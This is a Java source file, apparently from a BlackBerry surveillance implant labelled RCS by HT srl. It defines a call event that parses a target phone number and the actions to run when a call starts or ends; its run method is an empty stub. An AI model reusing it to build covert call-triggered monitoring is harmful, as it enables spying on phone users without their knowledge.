//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class CallEvent.
 */
public final class CallEvent extends Event {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallEvent", DebugLevel.VERBOSE);
    //#endif
    
    String number;
    int actionOnEnter;
    int actionOnExit;
    
    /**
     * Instantiates a new call event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public CallEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_CALL, actionId, confParams);
        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        // TODO Auto-generated method stub

    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();
            
            int len = databuffer.readInt();
            byte[] array = new byte[len];
            databuffer.read(array);
            number = WChar.getString(array, true);
            
        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("number: " + number);
        //#endif
        
        return true;
    }

}
